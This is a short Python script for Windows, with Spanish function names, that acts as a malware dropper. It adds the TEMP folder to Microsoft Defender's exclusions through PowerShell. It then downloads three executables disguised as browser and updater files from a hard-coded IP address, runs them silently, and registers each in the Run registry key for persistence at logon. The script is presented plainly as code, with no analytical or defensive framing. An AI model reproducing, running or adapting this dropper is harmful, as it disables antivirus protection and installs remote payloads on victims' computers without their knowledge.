import os
import subprocess
import requests
import winreg as reg

burls = [
    "http://87.120.116.69/uploads/edge.exe",
    "http://87.120.116.69/uploads/Updater.exe",
    "http://87.120.116.69/uploads/Chromium.exe"
]

def descargar_y_guardar(url, carpeta):
    nombre_archivo_local = os.path.join(carpeta, url.split('/')[-1])
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(nombre_archivo_local, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
    return nombre_archivo_local

def agregar_a_registro(nombre_clave, ruta_archivo):
    clave_registro = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        # Abrir la clave de registro para edición
        llave = reg.OpenKey(reg.HKEY_CURRENT_USER, clave_registro, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(llave, nombre_clave, 0, reg.REG_SZ, ruta_archivo)
        reg.CloseKey(llave)
    except Exception as e:
        print(f"Error al modificar el registro: {e}")

def agregar_exclusion_defender(carpeta):
    try:
        comando = f"Add-MpPreference -ExclusionPath '{carpeta}'"
        subprocess.run(["powershell.exe", "-Command", comando], check=True)
    except Exception as e:
        print(f"Error : {e}")

temp_dir = os.getenv("TEMP") 

agregar_exclusion_defender(temp_dir)

archivos = [descargar_y_guardar(url, temp_dir) for url in burls]

for archivo in archivos:
    subprocess.Popen([archivo], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    agregar_a_registro(os.path.basename(archivo), archivo)
